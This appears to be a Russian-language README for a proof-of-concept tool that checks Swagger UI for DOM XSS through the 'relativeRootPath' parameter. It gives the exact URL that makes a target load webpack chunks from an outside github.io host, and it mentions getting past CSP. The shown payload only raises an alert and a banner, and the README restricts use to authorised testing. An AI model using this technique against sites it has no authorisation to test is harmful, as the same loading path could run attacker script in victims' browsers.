# XSS Validator for Swagger UI

Валидатор для проверки уязвимости DOM XSS через параметр `relativeRootPath` в Swagger UI.

## 🎯 Как это работает

Swagger UI загружает webpack chunk файлы относительно параметра `relativeRootPath`. Подмена этих chunk файлов позволяет выполнить произвольный JavaScript в контексте целевого домена.

## 🚀 Использование

### 1. URL валидатора

```text
https://cleverg0d.github.io/XSS_check
```

### 2. Использование в Swagger UI

```text
https://target-domain.com/-/sandbox/swagger?relativeRootPath=https://cleverg0d.github.io/XSS_check
```

**Важно:**

- Используйте `github.io` (не `github.com`!)
- Не добавляйте `/assets/webpack/` в URL
- Swagger UI сам добавит путь к chunks

### 3. Результат

Если уязвимость присутствует, вы увидите:

- Alert с доменом целевого сайта
- Красный баннер вверху страницы
- Сообщения в консоли браузера (F12)

## ⚠️ Примечания

- На хостах с CSP может потребоваться расширение Wappalyzer (bypass CSP)
- На хостах без CSP работает напрямую
- Используйте только для тестирования собственных приложений или с разрешения

## 📁 Структура

```text
assets/webpack/
├── 36df1bb1.ce610158.chunk.js
├── vendors-openapi.a134578a.chunk.js
├── vendors-openapi.ab844f42.chunk.js
├── vendors-openapi.b3186ab9.chunk.js
├── vendors-openapi.eb51da36.chunk.js
└── vendors-openapi.f0ad11b5.chunk.js
```
